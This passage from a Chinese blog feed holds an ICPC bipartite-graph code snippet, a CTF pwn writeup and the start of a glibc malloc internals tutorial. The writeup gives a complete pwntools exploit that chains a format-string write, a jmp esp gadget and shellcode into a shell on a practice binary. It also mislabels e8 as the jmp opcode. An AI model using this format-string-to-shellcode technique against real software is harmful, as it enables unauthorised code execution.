class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line">cin&gt;&gt;x;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">add</span>(i,j+n);</span><br><span class="line"><span class="built_in">add</span>(j+n,i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">xyl</span>()==n)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">cin&gt;&gt;t;</span><br><span class="line"><span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里被卡了有点久，最后发现是数组越界，在使用前向星存无向图的时候一定要记得开两倍内存，不然写越界了很难说错误在哪。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>血淋淋的教训，并且失败的俩测试点没有报错re，而是wrong answer。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;然后今天来学二分图，首先我们来看看二分图的定义。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="二分图" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E4%BA%8C%E5%88%86%E5%9B%BE/"/>
    
    
  </entry>
  
  <entry>
    <title>actf_2019_onerepeater writeup</title>
    <link href="http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/"/>
    <id>http://example.com/2022/02/02/actf_2019_onerepeater%20writeup/</id>
    <published>2022-02-01T18:00:00.000Z</published>
    <updated>2022-02-02T12:26:28.320Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录，<a href="https://buuoj.cn/challenges#actf_2019_onerepeater">actf_2019_onerepeater</a></p><span id="more"></span><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到elf文件<code>checksec</code>一波，无任何保护，栈可执行，那么多半是要把程序流劫持到栈上执行<code>shellcode</code>了，拖进ida里面。</p><p>![1](actf_2019_onerepeater writeup/1.png)</p><p>逻辑比较简单，菜单题，然后选项2是明显的格式化字符串漏洞，1选项就是读入<code>0x400</code>字节的数据。首先找到<code>jmp esp</code>的<code>gadget</code>。</p><p>![2](actf_2019_onerepeater writeup/2.png)</p><p>有就很好办了，利用格式化字符串改掉返回地址为这个gadget，然后再在后面写一个跳板指令跳到缓冲区内，只要在退出之前把缓冲区写上shellcode就可以很快<code>get shell</code>了。</p><p>先通过测试偏移，发现buf在格式化字符串函数的第16个参数。</p><p>![3](actf_2019_onerepeater writeup/3.png)</p><p>那么我们先把返回地址劫持了再说，经过调试发现返回地址在buf+0x41c的位置上。</p><p>写出部分exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="部分汇编知识"><a href="#部分汇编知识" class="headerlink" title="部分汇编知识"></a>部分汇编知识</h2><p>这里需要讲一讲汇编的知识了，因为我们在<code>jmp esp</code>的时候<code>esp</code>是指向我们返回地址的后面一格，所以<code>eip</code>等会会指向<code>ret_addr+4</code>的位置上，那么这个位置我们写些什么呢，当然直接写<code>shellcode</code>是肯定没问题的，实际操作也不会太难，一个循环解决，但是当复杂起来的时候这个就有点难，所以再需要一个跳板指令执行<code>jmp buf</code>，这里我们讲讲<code>jmp</code>的实现，<code>jmp</code>的编码是<code>5</code>个字节，其实有分大跳小跳，小跳只要两个字节，但是只能跳前后<code>0x7f</code>以内的位置。这里要跳到<code>buf</code>显然要用大跳了，大跳的编码是<code>e8</code> 后面跟上小端的<code>int</code>字节序。这个<code>int</code>字节呢代表偏移。</p><p>平时我们看到的<code>jmp 0x400689</code>这些实际编码都不是这样子编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 89 06 40 00</span><br></pre></td></tr></table></figure><p>而是会根据这个指令所处的位置，然后计算下一条指令到我要跳转的指令位置的数值作为jmp的参数。</p><p>举个例子，假如这个jmp 0x400689所处的位置是0x400500。那么它的编码将是</p><p>0x400689-(0x400500+5)=0x134</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 34 01 00 00</span><br></pre></td></tr></table></figure><p>这样子得到的。</p><p>如果是往低地址跳那就用负数表示。</p><p>这里呢我们要往<code>buf</code>跳，也就是低地址跳转，那么我们指令的位置是<code>buf+0x420</code>，所以得到偏移<code>0x425</code>，因为指令长度占了五个，跳转的起始位置是执行完这个指令的下一个位置。</p><p>取负数得到<code>0xfffffbdb</code>。</p><p>我们就得到了跳板指令的编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e8 db fb ff ff</span><br></pre></td></tr></table></figure><p>同样在下方部署这些字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><p>那么最后指令就会跳转到<code>buf</code>上，在选择3之前在<code>buf</code>上填一遍<code>shellcode</code>就完事了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>![4](actf_2019_onerepeater writeup/4.png)</p><p>可以看到通过两次跳转，程序成功执行到了<code>shellcode</code>，然后就愉快的<code>cat flag</code> 吧</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,port)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf,libc,p=conn(<span class="number">1</span>,<span class="string">&#x27;./ACTF_2019_OneRepeater&#x27;</span>,port=<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">jmp_esp=<span class="number">0x08048907</span><span class="comment"># : jmp esp</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    byte=jmp_esp&amp;<span class="number">0xff</span></span><br><span class="line">    jmp_esp&gt;&gt;=<span class="number">8</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(byte).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x41c</span>+i)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\xe9\xdb\xfb\xff\xff&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    w=shellcode[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(w))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line">    x=p.recvline()</span><br><span class="line">    stack=<span class="built_in">int</span>(x,<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&#x27;stack:&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">    payload=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(w).encode()+<span class="string">b&#x27;c%24$hhn&#x27;</span>).ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\0&#x27;</span>)+p32(stack+<span class="number">0x420</span>+i)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&#x27;Exit&#x27;,b&#x27;3&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x80486FA\nb *0x80487C6&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录，&lt;a href=&quot;https://buuoj.cn/challenges#actf_2019_onerepeater&quot;&gt;actf_2019_onerepeater&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>malloc源码分析</title>
    <link href="http://example.com/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2022-01-26T18:00:00.000Z</published>
    <updated>2022-01-28T19:36:02.451Z</updated>
    
    <content type="html"><![CDATA[<p>学了这么久堆漏洞了，我想应该把<code>glibc</code>的<code>malloc</code>和<code>free</code>源码解析写一下了，希望能帮助一下刚上路的师傅，同时也巩固一下自身知识。</p><span id="more"></span><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p>我们平时写程序的时候，某些变量可能需要在开始就分配内存，这些内存是不可避免的。那么这些内存就是静态分配的，当程序编译完成之后，它就确定了占用这么多的内存。但是有时候，实际问题的规模没有预期那么大，我们不一定需要很大的内存，如果每次都按最大考虑那么就有很大一部分内存是被浪费的，这就是静态分配内存的弊端，虽然咱打acm的时候都是静态分配的，但是这没啥，因为每个问题不要超过它的总内存上限问题就不大(狗头。但是在内存不足的年代，如果都这样使用静态分配内存的方式，那么计算机的效率会被拖垮很多，所以就有动态分配内存的概念了。</p><p><code>glibc</code>采用<code>ptmalloc</code>的管理方式去分配内存。</p><h2 id="ptmalloc2的分配策略"><a href="#ptmalloc2的分配策略" class="headerlink" title="ptmalloc2的分配策略"></a>ptmalloc2的分配策略</h2><p>那么动态分配内存要怎么去分配呢？如果我们需要占用除了我程序本身占用的内存以外的一块内存，那程序指定是没权限用的，得先向操作系统申请这一块内存的使用权。而操作系统没那么闲，分配几个字节的内存都要它去管，操作系统管理都是按页式的管理。而一页的内存是<code>0x1000B</code>，如果每一次申请我都向操作系统申请，每一次归还都直接归还给操作系统那么必定会增大操作系统的负担。因此分配内存的时候可以按照一个策略去分配，分配一定得尽量避免过多地使用系统调用，归还的时候可以等到程序结束时一并归还，这样的话操作系统的负担就大大下降了。</p><p><code>ptmalloc2</code>的分配方式会在你第一次<code>malloc</code>的时候向操作系统申请<code>0x21000B(132KB)</code>的内存，然后后续分配就不会向操作系统申请内存，只有用完了的时候才会再次申请内存。</p><p>操作系统的问题解决了之后我们再来看看<code>glibc</code>怎么处理具体的分配细节。分配的时候我一定是切出一块特定大小才是最优的策略的，比如程序<code>malloc(4)</code>，那我接切个4字节的内存给它用，<code>malloc(1)</code>那就给它一字节去使用。然而现实没有那么理想，因为如果我切下来的块用户程序完全可写的话，那么我怎么区分这个内存块是否被使用呢？然后内存块的分界线又如何界定呢？所以分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。那么可以在每个分配的内存块加上一个<code>int</code>数据作为此内存块的<code>size</code>，64位的操作系统可以使用<code>long long</code>。同理，为了管理方便，<code>glibc</code>在分配<code>chunk</code>的时候也并不是分配这么多就只能写这么多的。它也不想闲到去管1字节2字节这样的内存块。而且如果有这样的内存块，那么在分配指针的时候内存没办法对齐会出现很多麻烦的事。所以在分配内存块的时候，有一个<code>SIZE_SZ</code>，一次分配的内存必定是<code>SIZE_SZ*2</code>的整倍数，<code>SIZE_SZ</code>在32位操作系统下的值是<code>4</code>，64位的值是<code>8</code>。为了方便，以下把内存块统一叫<code>chunk</code>。</p><p>以32位操作系统为例，size的值必定为8的整数倍，二进制角度下看来，低三位永远是0，这样有点浪费了内存，因此规定<code>size</code>的低三位不作为实际的<code>chunk</code>大小，而是标志位。三个标志位从高位到低位分别是：</p><ol><li><code>NON_MAIN_ARENA</code>:是否为主分配，0表示是主分配，权值为4</li><li><code>IS_MMAPPED</code>:表示内存是否为<code>mmap</code>获得，0表示不是，权值为2</li><li><code>PREV_INUSE</code>:表示前面一个内存块是否被使用，0表示不被使用，权值为1</li></ol><p>在64位操作系统中，多出一个标志位，但是这个标志位无任何意义，可能后续会赋予别的意义，但是它一样不影响<code>chunk</code>的大小。</p><p>在看malloc源码的时候可以看到一个宏定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>那么就可以看到<code>chunksize</code>在取实际<code>size</code>的时候与了一个<code>0xfffffff8</code>，忽略了最低三位，64位操作系统则会忽略最低四位。</p><p>以下例子为64位操作系统</p><p><code>chunk</code>最小的大小为<code>0x20</code>，为什么没有<code>0x10</code>大小的<code>chunk</code>呢，这么看来<code>size</code>占了<code>8</code>字节还能有8字节给用户去写似乎没问题。大不了我超过<code>8B</code>再分配<code>0x20</code>大小的内存嘛，这个疑问先放一下，我们来看看这样的策略它还有没有什么问题。</p><p>如果一个<code>chunk</code>被确定释放了，那么该以什么方式去管理。你会想到前面有一个<code>prev_inuse</code>位可以确定一个堆块是否被释放，你会想到改下一个<code>chunk</code>的标志位就可以了，但是如果这个内存块再次被需要呢，难道去遍历每一个<code>chunk</code>，一来要看<code>size</code>符不符合，二来还要看它有没有被使用，这样时间开销太大了。因为空闲的<code>chunk</code>可能散落在内存各个角落，管理零碎内存最好的办法就是链表。链表还得有表头，这个表头其实就是我们的<code>main_arena</code>中的<code>bin</code>。因此<code>chunk</code>上还得有一块内存是指针，指针又占了<code>8</code>个字节。</p><p>但是你可能想到，指针它只在块被释放的时候有用啊，<code>0x10</code>的块，一个<code>size</code>，一个指针，被分配的时候用指针作为数据域，被释放的时候指针用于链式管理。这样就解决了，这样也的确没问题。但是看看它这样的分配策略还有没有问题？如果我多次分配<code>chunk</code>很小的块，<code>free</code>之后它们便只能用于分配这么大的内存了。如果不加另一种策略组织起来，导致内存碎片越来越多，就容易耗尽系统内存。</p><p>那么就有<code>ptmalloc</code>的又一个策略：尽量合并物理相邻的<code>free_chunk</code>。咱们前面一直提到切割内存块，合并内存块就是切割的一个逆过程。在合并的时候我可能前面会有<code>free</code>的内存块，后面也会有<code>free</code>的内存块。那么我怎么在只知道我自身信息的情况下准确找到前后的<code>chunk</code>具体在哪呢。</p><p>想找到后面的很容易，我知道我自己所在的位置（指针），也知道我的<code>size</code>，那么相加就可以找到后面的<code>size</code>了。那么我如何找前面的<code>size</code>在什么位置呢？所以就不得不再开辟一个内存来存前一个<code>chunk</code>的信息了。通过<code>prev_inuse</code>位我很容易得知前一个<code>chunk</code>有没有被<code>free</code>，但是我并不知道前一个<code>chunk</code>的大小啊。所以在一个<code>chunk</code>的结构体，在size之前还会有一个<code>prev_size</code>。与前面那个指针同理，我只有在前一个块被<code>free</code>需要合并的时候才会想看看它在哪，他要是都还在用我都没必要去使用这个<code>prev_size</code>字段了。但是要注意，这个<code>prev_size</code>是服务于上一个<code>chunk</code>的。所以一个chunk的结构体就有<code>0x10</code>个不得不分配的字节，而且自己还不能用。因此<code>0x10</code>的<code>chunk</code>就没有意义了。所以源码中也会找到这样的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE 4*SIZE_SZ</span></span><br></pre></td></tr></table></figure><p>说了这么多了，<code>ptmalloc</code>的策略大致总结一下就是：</p><ol><li><p>一次系统调用会分配大块内存</p></li><li><p>程序结束后统一归还内存给操作系统</p></li><li><p>方便管理，内存分配尽量对齐，也就是所谓的size为某某整倍数</p></li><li><p>尽量分配最小能满足的内存块</p></li><li><p>链式管理空闲空间，适当的时候合并物理相邻的<code>chunk</code></p></li></ol><p>而且根据以上分析我们可以得出一些关于<code>chunk</code>的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    chunk *fd;</span><br><span class="line">    chunk *bk;<span class="comment">//因为链式管理还有可能是双向链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们大致就明白了<code>ptmalloc</code>的分配方式。</p><h2 id="ptmalloc2的具体分配策略"><a href="#ptmalloc2的具体分配策略" class="headerlink" title="ptmalloc2的具体分配策略"></a>ptmalloc2的具体分配策略</h2><p>前面我们讲到了，对于空闲块使用了链式管理方式。但是对于不同大小的<code>chunk</code>，它又有细分。这里先给一个概念：<code>bin</code>，字面意义垃圾桶，用于装<code>free_chunk</code>的垃圾桶，在这里可以理解为链表表头。</p><p>以下均以<code>glibc 2.23</code>版本解析</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>对于<code>size</code>较小的<code>free_chunk</code>，我们认为它很快就会被再次用到，因此在<code>free</code> <code>0x20~0x80</code>大小的<code>chunk</code>时，我们会把它扔进<code>fast bin</code>里面，字面意义，里面存的<code>free_chunk</code>很快会被再次用到。<code>fast bin</code> 管理<code>free_chunk</code>采用单链表方式，并且符合后进先出（<code>FILO</code>）的原则，比如以下程序段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">y=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="built_in">free</span>(y);</span><br><span class="line">z=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">w=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>那么z会得到y的指针，w会得到x的指针。</p><p>并且<code>fast bin</code>的<code>chunk</code>的之后的<code>chunk</code> <code>prev_inuse</code>位永远为1。也就是说它永远被视为在使用中，但是通常这个使用中是用于检测参不参与物理相邻<code>chunk</code>的合并，所以不会参与物理相邻的<code>chunk</code>的合并，也不会被切割。它的匹配规则就是，定量匹配。比如我想要一个<code>0x30</code>的<code>chunk</code>，没有就是没有，没有我就找其它的，不会说<code>0x40</code>好像还挺合适就拿了，不会。</p><p><code>fast bin</code>一共有<code>10</code>个，<code>main_arena</code>结构体中，用<code>fastbinsY</code>来存储每一个<code>fast bin</code>的链表头部，32位系统中，<code>fast bin</code>，从0x10开始到<code>0x40</code>，有7种<code>fast bin</code>，64位系统从<code>0x20</code>开始到<code>0x80</code>，也是七种<code>fast bin</code>。单个<code>fast bin</code>链表上的<code>chunk</code>大小一定严格相等。</p><p>一定情况下可以修改<code>global_max_fast</code>的值来调整<code>fast bin</code>的个数，64位系统下这个值通常为<code>0x80</code>，代表小于等于<code>0x80</code>的<code>chunk</code>都为<code>fast bin</code>。</p><p>其余的链表头部都在<code>bin</code>数组当中。并且由于只有<code>fast bin</code>是单链表结构，其余<code>bin</code>都是双向链表结构，<code>bin</code>会成对出现。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>对于非<code>fast bin</code>大小的<code>chunk</code>，被释放时会首先进入<code>unsorted bin</code>。<code>unsorted bin</code>在特定的时候会进入<code>small bin</code> 和 <code>large bin</code>。</p><p>非<code>fast bin</code>的<code>bin</code>都是用一对<code>bin</code>指针来描述的，这两个<code>bins</code>也要看成一个<code>chunk</code>，然后初始它们的<code>fd</code>和<code>bk</code>都指向自身的<code>prev_size</code>那个位置。比如<code>main_arena+104</code>这个地方是<code>bin</code>数组的第一个，然后呢<code>main_arena+104</code>和<code>main_arena+112</code>分别就是<code>unsorted bin</code>的头部，它们本身虽然不是<code>chunk</code>，但是要理解它们的初始状态还是得看成一个<code>chunk</code>。所以<code>main_arena+104</code>和<code>main_arena+112</code>的初始值就是<code>main_arena+88</code>。如图：</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>设置这一个<code>bin</code>的主要目的是扮演一个缓存层的角色以加快分配和释放的操作，链表中<code>chunk</code>大小不一定相等且无序排列。</p><p>当需要检查<code>unsorted bin</code>的时候，会遍历整个链表，寻找第一个能满足的<code>chunk</code>大小切割。如果切割后的大小不足<code>2*SIZE_SZ</code>，则不会切割，而是将整个堆块返回给用户使用。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>一共有<code>62</code>个，从最小的<code>chunk</code>开始，公差为<code>SIZE_SZ*2</code>，双链表管理。它的特点也是跟fast bin一样，单条链表<code>chunk</code>大小相等，但是它会参与合并，切割。先进先出（<code>FIFO</code>）的策略。它表示的范围就是<code>4*SIZE_SZ~126*SIZE_SZ</code></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><code>large bin</code>与<code>small bin</code>不一样，<code>large bin</code>表示的是一个范围。一共有<code>63</code>个(假设下标<code>0~62</code>)，从<code>small 